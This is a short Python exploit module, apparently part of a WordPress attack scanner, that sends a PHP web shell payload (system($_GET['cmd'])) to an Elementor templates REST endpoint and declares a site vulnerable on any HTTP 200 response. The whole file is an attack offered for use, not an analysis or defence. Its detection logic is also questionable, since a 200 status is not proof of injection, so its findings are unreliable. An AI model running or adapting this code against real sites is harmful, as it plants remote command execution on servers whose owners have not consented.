import requests
from core.printmodels import *

class Elementor_Template_Exploit:
    def __init__(self):
        self.name = "Elementor Template Injection"
        self.description = "WordPress Elementor Template Injection Vulnerability"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/wp-json/elementor/v1/templates"
            payload = {
                "source": "remote",
                "template": "<?php system($_GET['cmd']); ?>",
                "content": "malicious_content"
            }
            response = requests.post(endpoint, json=payload, verify=False, timeout=10)
            
            if response.status_code == 200:
                return PrintSuccess(f"[Elementor] Vulnerable! Template injection successful")
            return PrintFailed("[Elementor] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Elementor] Error: {str(e)}")
